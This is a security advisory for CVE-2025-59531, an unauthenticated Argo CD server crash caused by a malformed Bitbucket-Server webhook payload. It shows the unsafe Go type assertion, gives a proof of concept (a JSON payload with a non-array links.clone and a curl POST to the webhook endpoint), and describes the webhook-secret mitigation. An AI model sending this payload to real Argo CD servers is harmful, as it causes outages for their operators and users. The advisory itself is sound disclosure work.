# Unauthenticated argocd-server panic via a malicious Bitbucket-Server webhook payload

**GHSA**: GHSA-f9gq-prrc-hrhc | **CVE**: CVE-2025-59531 | **Severity**: high (CVSS 7.5)

**CWE**: CWE-703

**Affected Packages**:
- **github.com/argoproj/argo-cd** (go): >= 1.2.0, <= 1.8.7
- **github.com/argoproj/argo-cd/v2** (go): >= 2.0.0-rc1, <= 2.14.19
- **github.com/argoproj/argo-cd/v3** (go): = 3.2.0-rc1
- **github.com/argoproj/argo-cd/v3** (go): >= 3.1.0-rc1, <= 3.1.7
- **github.com/argoproj/argo-cd/v3** (go): >= 3.0.0-rc1, <= 3.0.18

## Description

### Summary

Unpatched Argo CD versions are vulnerable to malicious API requests which can crash the API server and cause denial of service to legitimate clients. 

With the default configuration, no `webhook.bitbucketserver.secret` set, Argo CD’s /api/webhook endpoint will crash the entire argocd-server process when it receives a Bitbucket-Server push event whose JSON field `repository.links.clone` is anything other than an array.

A single unauthenticated curl request can push the control-plane into CrashLoopBackOff; repeating the request on each replica causes a complete outage of the API.

### Details
```go
// webhook.go (Bitbucket-Server branch in affectedRevisionInfo)

for _, l := range payload.Repository.Links["clone"].([]any) {   // <- unsafe cast
    link := l.(map[string]any)
    ...
}
```

If links.clone is a string, number, object, or null, the first type assertion panics:
interface conversion: interface {} is string, not []interface {}

The worker goroutine created by startWorkerPool lacks a recover, so the panic terminates the whole binary.

### PoC

Save as payload-panic.json - note the non-array links.clone.

```json
{
  "eventKey": "repo:refs_changed",
  "repository": {
    "name": "guestbook",
    "fullName": "APP/guestbook",
    "links": { "clone": "boom" }
  },
  "changes": [ { "ref": { "id": "refs/heads/master" } } ]
}
```

```shell
curl -k -X POST https://argocd.example.com/api/webhook \
     -H 'X-Event-Key: repo:refs_changed' \
     -H 'Content-Type: application/json' \
     --data-binary @payload-panic.json
```

Observed crash (argocd-server restart):

```
panic: interface conversion: interface {} is string, not []interface {}
goroutine 192 [running]:
github.com/argoproj/argo-cd/v3/server/webhook.affectedRevisionInfo
    webhook.go:209 +0x1218
...
```

### Mitigation

If you use Bitbucket Server and need to handle webhook events, configure a webhook secret to ensure only trusted parties can invoke the webhook handler.

If you do not use Bitbucket Server, you can set the webhook secret to a long, random value to effectively disable webhook handling for Bitbucket Server payloads.

```diff
apiVersion: v1
kind: Secret
metadata:
  name: argocd-secret
type: Opaque
data:
+  webhook.bitbucketserver.secret: <your base64-encoded secret here>
```

### For more information

* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)
* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd

### Credits

Discovered by Jakub Ciolek at AlphaSense.
